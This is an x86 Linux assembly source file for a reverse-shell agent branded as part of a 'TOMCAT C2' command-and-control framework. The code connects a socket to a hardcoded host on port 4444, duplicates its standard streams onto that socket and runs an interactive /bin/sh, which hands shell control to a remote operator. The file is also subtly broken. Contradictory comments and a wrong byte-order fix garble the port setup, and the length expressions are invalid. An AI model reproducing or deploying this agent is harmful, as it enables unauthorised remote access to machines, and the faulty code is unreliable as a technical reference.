asm
section .data
    HOST db "0.0.0.0",0
    PORT dw 4444
    XBanner db "___________________      _____  _________     ________________",10
            db "\__    ___/\_____  \    /     \ \_   ___ \   /  _  \__    ___/",10
            db "  |    |    /   |   \  /  \ /  \/    \  \/  /  /_\  \|    |   ",10
            db "  |    |   /    |    \/    Y    \     \____/    |    \    |   ",10
            db "  |____|   \_______  /\____|__  /\______  /\____|__  /____|   ",10
            db "                   \/         \/        \/         \/         ",10
            db "            <   TOMCAT C2 Frameworks V2 Agent   />",10,0

    shell db "/bin/sh",0
    sh_arg1 db "-i",0
    argv dd shell, sh_arg1, 0

    err_msg db "Network Error!. Failed To Start Shell Session.",10,0
    start_msg db "Shell Session Started.",10,0

section .bss
    sockfd resd 1

section .text
    global _start

    extern socket
    extern connect
    extern dup2
    extern execve
    extern write
    extern exit

_start:
    ; print XBanner
    mov edx,  len XBanner
    mov ecx,  XBanner
    mov ebx,  1          ; stdout
    mov eax,  4          ; sys_write
    int 0x80

    ; socket(AF_INET, SOCK_STREAM, 0)
    push 0              ; protocol
    push 1              ; SOCK_STREAM
    push 2              ; AF_INET
    mov eax, 102        ; sys_socketcall
    mov ebx, 1          ; SYS_SOCKET
    mov ecx, esp
    int 0x80
    mov [sockfd], eax
    test eax, eax
    js socket_fail

    ; prepare sockaddr_in struct on stack
    ; struct sockaddr_in {
    ;   short sin_family; (AF_INET = 2)
    ;   unsigned short sin_port; (network byte order)
    ;   struct in_addr sin_addr; (4 bytes)
    ;   char sin_zero[8];
    ; }
    sub esp, 16
    mov word [esp], 2               ; AF_INET
    mov word [esp+2], 0x5B8A       ; port 4444 in network byte order (0x5B8A = 4444)
    ; 0x5B8A is 4444 in hex but in network byte order (big endian) it should be 0x5B8A
    ; Actually 4444 decimal = 0x115C, network byte order is big endian: 0x115C -> 0x5C11
    ; Correct port: 4444 decimal = 0x115C hex
    ; So port should be 0x115C in network byte order (big endian)
    ; So bytes: 0x11 0x5C
    ; So word [esp+2] = 0x115C
    mov word [esp+2], 0x115C       ; correct port in network byte order
    ; IP 0.0.0.0 = 0x00000000
    mov dword [esp+4], 0
    mov dword [esp+8], 0            ; sin_zero

    ; connect(sockfd, sockaddr_in*, 16)
    mov eax, 102        ; sys_socketcall
    mov ebx, 3          ; SYS_CONNECT
    mov ecx, esp        ; pointer to sockaddr_in
    push 16             ; addrlen
    push ecx            ; sockaddr pointer
    push dword [sockfd] ; sockfd
    mov ecx, esp
    int 0x80
    add esp, 12
    test eax, eax
    js connect_fail

    ; print "Shell Session Started."
    mov edx, 21
    mov ecx, start_msg
    mov ebx, 1
    mov eax, 4
    int 0x80

    ; dup2(sockfd, 0)
    mov ebx, [sockfd]
    mov ecx, 0
    mov eax, 63         ; sys_dup2
    int 0x80

    ; dup2(sockfd, 1)
    mov ebx, [sockfd]
    mov ecx, 1
    mov eax, 63
    int 0x80

    ; dup2(sockfd, 2)
    mov ebx, [sockfd]
    mov ecx, 2
    mov eax, 63
    int 0x80

    ; execve("/bin/sh", ["/bin/sh", "-i", NULL], NULL)
    mov eax, 11         ; sys_execve
    mov ebx, shell
    mov ecx, argv
    xor edx, edx        ; envp = NULL
    int 0x80

    ; if execve fails, exit
    mov eax, 1
    xor ebx, ebx
    int 0x80

socket_fail:
connect_fail:
    ; print error message
    mov edx, 40
    mov ecx, err_msg
    mov ebx, 2          ; stderr
    mov eax, 4
    int 0x80

    ; exit(1)
    mov eax, 1
    mov ebx, 1
    int 0x80

len equ $ - XBanner